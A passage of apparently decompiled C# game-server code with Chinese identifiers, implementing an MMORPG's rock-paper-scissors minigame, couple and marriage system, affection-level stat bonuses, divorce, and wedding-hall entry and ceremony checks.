								更新广播人物数据();
								更新人物数据(this);
								break;
							}
							}
						}
						else
						{
							系统提示("当前不足" + World.占卜费用 + "元宝,无法占卜", 9, "占卜提示");
						}
					}
					break;
				}
				case 2:
				{
					int id = new Random(DateTime.Now.Millisecond).Next(1, 101);
					石头剪子布提示(num, 1, id, 0);
					break;
				}
				case 3:
				{
					int num3 = BitConverter.ToInt16(封包数据, 14);
					if (num3 != 0)
					{
						int[,] array = new int[3, 3]
						{
							{
								0,
								2,
								1
							},
							{
								1,
								0,
								2
							},
							{
								2,
								1,
								0
							}
						};
						int[] obj = new int[3]
						{
							0,
							1,
							2
						};
						int num4 = new Random(DateTime.Now.Millisecond).Next(0, 3);
						int num5 = obj[array[num3 - 1, num4]];
						Console.WriteLine(cc(num3 - 1) + ":" + cc(num4) + "  " + bb(num5));
						int d = 0;
						switch (num5)
						{
						case 2:
							石头剪子布赢次数 = 0;
							d = 200;
							break;
						case 1:
							石头剪子布赢次数++;
							d = 石头剪子布赢次数;
							break;
						}
						石头剪子布提示(num, 1, num4 + 1, d);
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "石头剪子布  出错" + base.Userid + "|" + base.UserName + "  " + ex.Message);
			}
		}

		public void 石头剪子布提示(int 主ID, int 状态ID, int id, int d2)
		{
			byte[] array = Converter.hexStringToByte("AA550E00EC0274170800010001007427000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(主ID), 0, array, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(状态ID), 0, array, 12, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 14, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(d2), 0, array, 16, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 情侣系统(byte[] data, int length)
		{
			try
			{
				byte[] array = new byte[14];
				byte[] array2 = new byte[14];
				System.Buffer.BlockCopy(data, 33, array, 0, 14);
				string text = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
				System.Buffer.BlockCopy(data, 18, array2, 0, 14);
				string text2 = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				int num = data[10];
				int num2 = data[14];
				switch (num)
				{
				case 2:
				case 6:
				case 9:
				case 10:
				case 11:
				case 16:
				case 18:
				case 19:
					break;
				case 1:
					if (base.FLD_情侣.Length != 0)
					{
						情侣提示(16, text2, text);
					}
					else
					{
						Players players3 = World.检查玩家name(text);
						if (players3 != null)
						{
							if (players3.个人商店 == null && !players3.进店中 && !players3.打开仓库中)
							{
								if (players3.FLD_情侣.Length != 0)
								{
									情侣提示(16, text2, text);
								}
								else if (players3.Config.告白开关 == 0)
								{
									情侣提示(21, text2, text);
								}
								else if (players3.Player_Sex == base.Player_Sex)
								{
									情侣提示(24, text2, text);
								}
								else
								{
									情侣提示(6, text2, text);
									players3.情侣请求(1, text2, text);
								}
							}
						}
						else
						{
							情侣提示(18, text2, text);
						}
					}
					break;
				case 3:
				{
					byte[] array4 = new byte[4];
					System.Buffer.BlockCopy(data, 54, array4, 0, 4);
					int 玫瑰ID = BitConverter.ToInt32(array4, 0);
					Players players = World.检查玩家name(text);
					if (players != null)
					{
						if (base.FLD_情侣 == players.UserName)
						{
							if (!players.追加状态列表.ContainsKey(1000000891) && !players.追加状态列表.ContainsKey(1000000892) && !players.追加状态列表.ContainsKey(1000000893))
							{
								players.情侣送花请求(3, text2, text, 玫瑰ID);
							}
							else
							{
								系统提示("对方已存在状态1");
							}
						}
					}
					else
					{
						情侣提示(18, text2, text);
					}
					break;
				}
				case 4:
				{
					Players players2 = World.检查玩家name(text);
					if (players2 != null)
					{
						if (是否已婚 == 1)
						{
							bool flag = false;
							bool flag2 = false;
							int 位置 = 0;
							int 位置2 = 0;
							for (int i = 0; i < 66; i++)
							{
								if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000415)
								{
									位置 = i;
									flag = true;
									break;
								}
							}
							for (int j = 0; j < 66; j++)
							{
								if (BitConverter.ToInt32(players2.装备栏包裹[j].物品ID, 0) == 1000000415)
								{
									位置2 = j;
									flag2 = true;
									break;
								}
							}
							if (flag && flag2)
							{
								base.FLD_情侣 = "";
								base.FLD_情侣_爱情度 = 0;
								是否已婚 = 0;
								婚戒刻字 = string.Empty;
								解除关系倒计时 = 0;
								players2.FLD_情侣 = "";
								players2.FLD_情侣_爱情度 = 0;
								players2.是否已婚 = 0;
								武功新[2, 16] = null;
								武功新[2, 17] = null;
								players2.婚戒刻字 = string.Empty;
								players2.解除关系倒计时 = 0;
								players2.武功新[2, 16] = null;
								players2.武功新[2, 17] = null;
								减去物品(位置, 1);
								players2.减去物品(位置2, 1);
								系统提示("离婚完成，请下线后再上", 9, "离婚");
								players2.系统提示("离婚完成，请下线后再上", 9, "离婚");
							}
							else
							{
								系统提示("双方离婚,必须同时携带物品  " + ItmeClass.得到物品名称(1000000415), 50, "");
							}
						}
						else
						{
							base.FLD_情侣 = "";
							base.FLD_情侣_爱情度 = 0;
							是否已婚 = 0;
							婚戒刻字 = string.Empty;
							解除关系倒计时 = 0;
							players2.FLD_情侣 = "";
							players2.FLD_情侣_爱情度 = 0;
							players2.是否已婚 = 0;
							武功新[2, 16] = null;
							武功新[2, 17] = null;
							players2.婚戒刻字 = string.Empty;
							players2.解除关系倒计时 = 0;
							players2.武功新[2, 16] = null;
							players2.武功新[2, 17] = null;
							系统提示("离婚完成，请下线后再上", 9, "离婚");
							players2.系统提示("离婚完成，请下线后再上", 9, "离婚");
						}
					}
					else
					{
						情侣提示(18, text2, text);
					}
					break;
				}
				case 5:
					解除关系倒计时 = 4320;
					情侣提示(11, base.UserName, text);
					更新情侣系统(1, text, 婚戒刻字, 解除关系倒计时, DateTime.Now);
					RxjhClass.变更婚姻状态(text, 解除关系倒计时);
					break;
				case 7:
				{
					int num3 = data[14];
					Players players4 = World.检查玩家name(text2);
					if (players4 != null)
					{
						if (num3 == 3)
						{
							base.FLD_情侣 = players4.UserName;
							players4.FLD_情侣 = base.UserName;
							解除关系倒计时 = 0;
							players4.解除关系倒计时 = 0;
							base.FLD_情侣_爱情度 = 0;
							players4.FLD_情侣_爱情度 = 0;
							FLD_爱情度等级 = 10;
							players4.FLD_爱情度等级 = 10;
							更新情侣系统(2, players4.UserName, 婚戒刻字, 解除关系倒计时, DateTime.Now);
							players4.更新情侣系统(2, base.UserName, players4.婚戒刻字, players4.解除关系倒计时, DateTime.Now);
							情侣提示(num3, text, text2);
							players4.情侣提示(num3, text2, text);
							players4.显示大字(base.人物全服ID, 403);
							显示大字(players4.人物全服ID, 403);
						}
						else
						{
							情侣提示(num3, text2, text);
							players4.情侣提示(num3, text2, text);
						}
					}
					break;
				}
				case 8:
				{
					byte[] array5 = new byte[4];
					System.Buffer.BlockCopy(data, 54, array5, 0, 4);
					int num10 = BitConverter.ToInt32(array5, 0);
					Players players9 = World.检查玩家name(text2);
					switch (num2)
					{
					case 8:
						if (players9 != null)
						{
							if (base.FLD_情侣 == players9.UserName)
							{
								players9.情侣提示(8, text2, text);
							}
						}
						else
						{
							情侣提示(18, text2, text);
						}
						break;
					case 7:
					{
						bool flag3 = false;
						if (!追加状态列表.ContainsKey(1000000891) && !追加状态列表.ContainsKey(1000000892) && !追加状态列表.ContainsKey(1000000893))
						{
							for (int k = 0; k < 66; k++)
							{
								if (BitConverter.ToInt32(players9.装备栏包裹[k].物品ID, 0) == num10)
								{
									flag3 = true;
									players9.减去物品(k, 1);
									break;
								}
							}
							if (!flag3)
							{
								情侣提示(16, text2, text);
							}
							else
							{
								int num11 = RNG.Next(10, 30);
								switch (num10)
								{
								case 1000000893:
									num11 = RNG.Next(30, 60);
									break;
								case 1000000892:
									num11 = RNG.Next(20, 40);
									break;
								}
								if (夫妻组队中)
								{
									num11 *= 2;
								}
								更新玫瑰排行(this, this, 1);
								base.FLD_情侣_爱情度 += num11;
								players9.FLD_情侣_爱情度 += num11;
								if (base.FLD_情侣_爱情度 >= 35000)
								{
									base.FLD_情侣_爱情度 = 35000;
									FLD_爱情度等级 = 1;
								}
								else if (base.FLD_情侣_爱情度 > 30000)
								{
									if (FLD_爱情度等级 == 2)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 1;
								}
								else if (base.FLD_情侣_爱情度 > 21000)
								{
									if (FLD_爱情度等级 == 3)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 2;
								}
								else if (base.FLD_情侣_爱情度 > 14700)
								{
									if (FLD_爱情度等级 == 4)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 3;
								}
								else if (base.FLD_情侣_爱情度 > 10290)
								{
									if (FLD_爱情度等级 == 5)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 4;
								}
								else if (base.FLD_情侣_爱情度 > 7203)
								{
									if (FLD_爱情度等级 == 6)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 5;
								}
								else if (base.FLD_情侣_爱情度 > 5042)
								{
									if (FLD_爱情度等级 == 7)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 6;
								}
								else if (base.FLD_情侣_爱情度 > 3025)
								{
									if (FLD_爱情度等级 == 8)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 7;
								}
								else if (base.FLD_情侣_爱情度 > 1513)
								{
									if (FLD_爱情度等级 == 9)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 8;
								}
								else if (base.FLD_情侣_爱情度 > 605)
								{
									if (FLD_爱情度等级 == 10)
									{
										情侣提示(27, base.UserName, players9.UserName);
									}
									FLD_爱情度等级 = 9;
								}
								else
								{
									FLD_爱情度等级 = 10;
								}
								if (players9.FLD_情侣_爱情度 >= 35000)
								{
									players9.FLD_情侣_爱情度 = 35000;
									players9.FLD_爱情度等级 = 1;
								}
								else if (players9.FLD_情侣_爱情度 > 30000)
								{
									if (players9.FLD_爱情度等级 == 2)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 1;
								}
								else if (players9.FLD_情侣_爱情度 > 21000)
								{
									if (players9.FLD_爱情度等级 == 3)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 2;
								}
								else if (players9.FLD_情侣_爱情度 > 14700)
								{
									if (players9.FLD_爱情度等级 == 4)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 3;
								}
								else if (players9.FLD_情侣_爱情度 > 10290)
								{
									if (players9.FLD_爱情度等级 == 5)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 4;
								}
								else if (players9.FLD_情侣_爱情度 > 7203)
								{
									if (players9.FLD_爱情度等级 == 6)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 5;
								}
								else if (players9.FLD_情侣_爱情度 > 5042)
								{
									if (players9.FLD_爱情度等级 == 7)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 6;
								}
								else if (players9.FLD_情侣_爱情度 > 3025)
								{
									if (players9.FLD_爱情度等级 == 8)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 7;
								}
								else if (players9.FLD_情侣_爱情度 > 1513)
								{
									if (players9.FLD_爱情度等级 == 9)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 8;
								}
								else if (players9.FLD_情侣_爱情度 > 605)
								{
									if (players9.FLD_爱情度等级 == 10)
									{
										players9.情侣提示(27, players9.UserName, base.UserName);
									}
									players9.FLD_爱情度等级 = 9;
								}
								else
								{
									players9.FLD_爱情度等级 = 10;
								}
								情侣提示(29, base.UserName, players9.UserName);
								players9.情侣提示(29, players9.UserName, base.UserName);
								if (追加状态列表 != null)
								{
									if (GetAddState(1000000891))
									{
										追加状态列表[1000000891].时间结束事件();
									}
									if (GetAddState(1000000892))
									{
										追加状态列表[1000000892].时间结束事件();
									}
									if (GetAddState(1000000893))
									{
										追加状态列表[1000000893].时间结束事件();
									}
								}
								else
								{
									追加状态列表 = new ThreadSafeDictionary<int, 追加状态类>();
								}
								状态效果(BitConverter.GetBytes(num10), 1, 603000);
								追加状态类 追加状态类 = new 追加状态类(this, 603000, num10, 0);
								追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
								switch (FLD_爱情度等级)
								{
								case 1:
								{
									base.人物追加最大_HP += 150;
									base.FLD_人物_追加_攻击 += 15;
									base.FLD_人物_追加_防御 += 15;
									int num12 = ++base.FLD_人物_追加_气功;
									base.FLD_人物_追加_经验百分比 += 0.05;
									更新气功();
									break;
								}
								case 2:
								{
									base.人物追加最大_HP += 150;
									base.FLD_人物_追加_攻击 += 15;
									base.FLD_人物_追加_防御 += 15;
									int num12 = ++base.FLD_人物_追加_气功;
									更新气功();
									break;
								}
								case 3:
									base.人物追加最大_HP += 150;
									base.FLD_人物_追加_攻击 += 15;
									base.FLD_人物_追加_防御 += 15;
									break;
								case 4:
									base.人物追加最大_HP += 150;
									base.FLD_人物_追加_攻击 += 10;
									base.FLD_人物_追加_防御 += 10;
									break;
								case 5:
									base.人物追加最大_HP += 150;
									base.FLD_人物_追加_攻击 += 10;
									base.FLD_人物_追加_防御 += 5;
									break;
								case 6:
									base.人物追加最大_HP += 150;
									base.FLD_人物_追加_攻击 += 5;
									base.FLD_人物_追加_防御 += 5;
									break;
								case 7:
									base.人物追加最大_HP += 150;
									base.FLD_人物_追加_攻击 += 5;
									break;
								case 8:
									base.人物追加最大_HP += 150;
									break;
								case 9:
									base.人物追加最大_HP += 100;
									break;
								case 10:
									base.人物追加最大_HP += 50;
									break;
								}
								更新武功和状态();
								更新HP_MP_SP();
							}
						}
						break;
					}
					}
					break;
				}
				case 12:
					情侣提示(38, text, text2, 0);
					情侣提示(38, text, text2, 1);
					情侣提示(38, text, text2, 2);
					break;
				case 13:
				{
					int num8 = data[66];
					int 地图3 = 9101;
					int num9 = 0;
					switch (num8)
					{
					case 1:
						num9 = 0;
						break;
					case 2:
						num9 = 1;
						break;
					}
					if (num8 != 0)
					{
						if (检测婚宴厅进入条件(地图3, 1000000333))
						{
							Players players8 = 得到人物数据(base.FLD_情侣);
							if (players8 != null)
							{
								物品类 物品类3 = 得到包裹物品(1000000333);
								if (物品类3 != null)
								{
									减去物品(物品类3.物品位置, 1);
								}
								婚礼入场券 = 1000000333;
								婚礼地图 = 地图3;
								婚礼模式 = num9;
								移动(0f, 280f, 15f, 婚礼地图);
								players8.移动(0f, 280f, 15f, 婚礼地图);
								预备时间 = DateTime.Now.AddMinutes(1.0);
								预备申请仪式计时器 = new System.Timers.Timer(30000.0);
								预备申请仪式计时器.Elapsed += 预备时间结束事件;
								预备申请仪式计时器.Enabled = true;
								预备申请仪式计时器.AutoReset = true;
								打开商店(168, 2, 0);
								系统提示("欢迎来到中式婚宴厅,您有三分钟的时间来我这申请开始婚礼仪式。", 6, "月下老人");
								players8.系统提示("欢迎来到中式婚宴厅,新娘请等待男方申请开始婚礼仪式。", 6, "月下老人");
							}
							else
							{
								情侣提示(18, base.UserName, base.FLD_情侣);
							}
						}
					}
					else
					{
						情侣提示(40, base.UserName, base.FLD_情侣);
					}
					break;
				}
				case 14:
				{
					int num4 = data[66];
					int 地图 = 9001;
					int num5 = 0;
					switch (num4)
					{
					case 1:
						num5 = 0;
						break;
					case 2:
						num5 = 1;
						break;
					}
					if (num4 != 0)
					{
						if (检测婚宴厅进入条件(地图, 1000000334))
						{
							Players players5 = 得到人物数据(base.FLD_情侣);
							if (players5 != null)
							{
								物品类 物品类 = 得到包裹物品(1000000334);
								if (物品类 != null)
								{
									减去物品(物品类.物品位置, 1);
								}
								婚礼入场券 = 1000000334;
								婚礼地图 = 地图;
								婚礼模式 = num5;
								移动(73f, -50f, 15f, 婚礼地图);
								players5.移动(73f, -50f, 15f, 婚礼地图);
								预备时间 = DateTime.Now.AddMinutes(3.0);
								预备申请仪式计时器 = new System.Timers.Timer(30000.0);
								预备申请仪式计时器.Elapsed += 预备时间结束事件;
								预备申请仪式计时器.Enabled = true;
								预备申请仪式计时器.AutoReset = true;
								打开商店(168, 2, 0);
								系统提示("欢迎来到中式婚宴厅,您有三分钟的时间来我这申请开始婚礼仪式。", 6, "月下老人");
								players5.系统提示("欢迎来到中式婚宴厅,新娘请等待男方申请开始婚礼仪式。", 6, "月下老人");
							}
							else
							{
								情侣提示(18, base.UserName, base.FLD_情侣);
							}
						}
					}
					else
					{
						情侣提示(40, base.UserName, base.FLD_情侣);
					}
					break;
				}
				case 15:
				{
					int num6 = data[66];
					int 地图2 = 9201;
					int num7 = 0;
					switch (num6)
					{
					case 1:
						num7 = 0;
						break;
					case 2:
						num7 = 1;
						break;
					}
					if (num6 != 0)
					{
						if (检测婚宴厅进入条件(地图2, 1000000335))
						{
							Players players6 = 得到人物数据(base.FLD_情侣);
							if (players6 != null)
							{
								物品类 物品类2 = 得到包裹物品(1000000335);
								if (物品类2 != null)
								{
									减去物品(物品类2.物品位置, 1);
								}
								婚礼入场券 = 1000000335;
								婚礼地图 = 地图2;
								婚礼模式 = num7;
								移动(-59f, 53f, 15f, 婚礼地图);
								players6.移动(-48f, -104f, 15f, 婚礼地图);
								预备时间 = DateTime.Now.AddMinutes(3.0);
								预备申请仪式计时器 = new System.Timers.Timer(30000.0);
								预备申请仪式计时器.Elapsed += 预备时间结束事件;
								预备申请仪式计时器.Enabled = true;
								预备申请仪式计时器.AutoReset = true;
								打开商店(168, 2, 0);
								系统提示("欢迎来到中式婚宴厅,您有三分钟的时间来我这申请开始婚礼仪式。", 6, "月下老人");
								players6.系统提示("欢迎来到中式婚宴厅,新娘请等待男方申请开始婚礼仪式。", 6, "月下老人");
							}
							else
							{
								情侣提示(18, base.UserName, base.FLD_情侣);
							}
						}
					}
					else
					{
						情侣提示(40, base.UserName, base.FLD_情侣);
					}
					break;
				}
				case 17:
					if (检测仪式申请条件(婚礼地图, 婚礼入场券))
					{
						Players players7 = 得到人物数据(base.FLD_情侣);
						if (players7 != null)
						{
							if (!World.婚礼list.ContainsKey(婚礼地图))
							{
								Wedding value = new Wedding(this, players7, 婚礼地图, 婚礼模式);
								World.婚礼list.Add(婚礼地图, value);
							}
							if (婚礼地图 == 9001)
							{
								World.华婚殿是否在使用中 = true;
							}
							else if (婚礼地图 == 9101)
							{
								World.龙赡殿是否在使用中 = true;
							}
							else if (婚礼地图 == 9201)
							{
								World.圣礼殿是否在使用中 = true;
							}
						}
					}
					break;
				case 20:
					证婚人提问答案 = data[66];
					break;
				case 21:
					if (base.Player_Money < 10000000L)
					{
						情侣提示(87, base.UserName, text);
					}
					else if (base.FLD_情侣.Length == 0)
					{
						情侣提示(16, base.UserName, text);
					}
					else if (得到包裹物品(1000000415) == null)
					{
						情侣提示(85, base.UserName, text);
					}
					else if (解除关系倒计时 != 0)
					{
						情侣提示(53, base.UserName, text);
					}
					else
					{
						byte[] array3 = new byte[32];
						System.Buffer.BlockCopy(data, 78, array3, 0, 32);
						string text3 = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
						更新情侣系统(1, text, text3, 解除关系倒计时, DateTime.Now);
						婚戒刻字 = text3;
						情侣提示(84, base.UserName, text);
						base.Player_Money -= 10000000L;
						更新金钱和负重();
					}
					break;
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "情侣系统  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "|" + base.UserName + ex.Message);
			}
		}

		public void 情侣送花请求(int ID, string 本人名字, string 对方名字, int 玫瑰ID)
		{
			byte[] array = Converter.hexStringToByte("AA5552007600791744000300000000000000D0D5BBCA4FC3FBB5DB000000000000306FD3F1C2B66F3000000000000000000022000000000000000000000000000000000000000000000000000000000000000000B7A655AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 10, 2);
			byte[] bytes = Encoding.Default.GetBytes(本人名字);
			byte[] bytes2 = Encoding.Default.GetBytes(对方名字);
			if (玫瑰ID != 0)
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(玫瑰ID), 0, array, 54, 4);
			}
			System.Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			System.Buffer.BlockCopy(bytes2, 0, array, 33, bytes2.Length);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 情侣提示(int id, string 本人名字, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA5552002C017A1744000C00000000000000B7B6CEDEBEC8000000000000000000DEB9D2C2B2DD000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			byte[] bytes = Encoding.Default.GetBytes(本人名字);
			byte[] bytes2 = Encoding.Default.GetBytes(对方名字);
			System.Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			System.Buffer.BlockCopy(bytes2, 0, array, 33, bytes2.Length);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 情侣提示(int id, string 本人名字, string 对方名字, int 地图ID)
		{
			byte[] array = Converter.hexStringToByte("AA5552002C017A1744000C00000000000000B7B6CEDEBEC8000000000000000000DEB9D2C2B2DD000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			byte[] bytes = Encoding.Default.GetBytes(本人名字);
			byte[] bytes2 = Encoding.Default.GetBytes(对方名字);
			System.Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			System.Buffer.BlockCopy(bytes2, 0, array, 33, bytes2.Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(地图ID), 0, array, 50, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 情侣请求(int id, string 本人名字, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA553E003F027917300001000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFF0000000000000000000029B955AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] bytes = Encoding.Default.GetBytes(本人名字);
			byte[] bytes2 = Encoding.Default.GetBytes(对方名字);
			System.Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			System.Buffer.BlockCopy(bytes2, 0, array, 33, bytes2.Length);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public bool 检测仪式申请条件(int 地图, int 入场券)
		{
			if (地图 == 0)
			{
				情侣提示(40, base.UserName, base.FLD_情侣);
				系统提示("只有本场婚礼新郎官才能申请进行婚礼仪式。");
				return false;
			}
			if (base.FLD_情侣.Length == 0)
			{
				情侣提示(16, "", "");
				return false;
			}
			if (base.FLD_情侣.Length == 0)
			{
				情侣提示(16, "", "");
				return false;
			}
			if (解除关系倒计时 != 0)
			{
				情侣提示(53, base.UserName, base.FLD_情侣);
				return false;
			}
			if (是否已婚 == 1)
			{
				情侣提示(16, base.UserName, base.FLD_情侣);
				return false;
			}
			Players players = 得到人物数据(base.FLD_情侣);
			if (players == null)
			{
				情侣提示(18, base.UserName, base.FLD_情侣);
				return false;
			}
			if (players.人物坐标_地图 != 地图)
			{
				情侣提示(64, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000333)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900090)
				{
					情侣提示(30, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900078)
				{
					players.情侣提示(30, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (入场券 == 1000000334)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900298)
				{
					情侣提示(30, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900283)
				{
					players.情侣提示(30, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (入场券 == 1000000335)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900300)
				{
					情侣提示(30, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900284)
				{
					players.情侣提示(30, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (得到包裹空位数() < 3)
			{
				情侣提示(50, players.UserName, players.FLD_情侣);
				return false;
			}
			if (players.得到包裹空位数() < 3)
			{
				系统提示("新娘背包没有空位了，清理后再申请。");
				players.情侣提示(50, players.UserName, players.FLD_情侣);
				return false;
			}
			if (得到包裹物品(1000000416) == null)
			{
				情侣提示(45, base.UserName, base.FLD_情侣);
				return false;
			}
			if (players.得到包裹物品(1000000416) != null)
			{
				return true;
			}
			系统提示("新娘必须携带情侣戒指才能进行婚礼仪式。");
			players.情侣提示(45, players.UserName, players.FLD_情侣);
			return false;
		}

		public bool 检测婚宴厅进入条件(int 地图, int 入场券)
		{
			if (base.Player_Sex == 2)
			{
				情侣提示(40, "", "");
				系统提示("租用婚宴厅只能由准新郎官发起申请。");
				return false;
			}
			if (base.FLD_情侣.Length == 0)
			{
				情侣提示(16, "", "");
				return false;
			}
			if (解除关系倒计时 != 0)
			{
				情侣提示(53, base.UserName, base.FLD_情侣);
				return false;
			}
			if (是否已婚 == 1)
			{
				情侣提示(16, base.UserName, base.FLD_情侣);
				return false;
			}
			Players players = 得到人物数据(base.FLD_情侣);
			if (players == null)
			{
				情侣提示(18, base.UserName, base.FLD_情侣);
				return false;
			}
			if (得到包裹物品(1000000416) == null)
			{
				情侣提示(45, base.UserName, base.FLD_情侣);
				return false;
			}
			if (players.得到包裹物品(1000000416) == null)
			{
				情侣提示(45, base.UserName, base.FLD_情侣);
				players.情侣提示(45, base.UserName, players.FLD_情侣);
				return false;
			}
			if (得到包裹物品(入场券) == null)
			{
				情侣提示(52, base.UserName, base.FLD_情侣);
				return false;
			}
			if (FLD_爱情度等级 > 4)
			{
				情侣提示(72, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000333 && World.龙赡殿是否在使用中)
			{
				情侣提示(49, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000334 && World.华婚殿是否在使用中)
			{
				情侣提示(49, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000335 && World.圣礼殿是否在使用中)
			{
				情侣提示(49, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000333)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900090)
				{
					情侣提示(48, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900078)
				{
					players.情侣提示(48, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (入场券 == 1000000334)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900298)
				{
					情侣提示(48, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900283)
				{
					players.情侣提示(48, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (入场券 == 1000000335)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900300)
				{
					情侣提示(48, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900284)
				{
					players.情侣提示(48, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					系统提示("新娘  " + players.UserName + "  必须穿着婚礼服才能进场。");
					return false;
				}
			}
			return true;
		}

		public void 预备时间结束事件(object sender, ElapsedEventArgs e)
		{
			try
			{
				if ((int)预备时间.Subtract(DateTime.Now).TotalSeconds <= 0)
				{
					if (婚礼地图 == 9101)
					{
						if (!World.龙赡殿是否在使用中)
						{
							foreach (Players value in World.allConnectedChars.Values)
							{
								int num = RNG.Next(1, 30);
								if (value.人物坐标_地图 == 婚礼地图)
								{
									int num2 = RNG.Next(1, 30);
									value.移动(num, num2, 15f, 101);
								}
							}
						}
					}
					else if (婚礼地图 == 9001)
					{
						if (!World.华婚殿是否在使用中)
						{
							foreach (Players value2 in World.allConnectedChars.Values)
							{
								int num3 = RNG.Next(1, 30);
								if (value2.人物坐标_地图 == 婚礼地图)
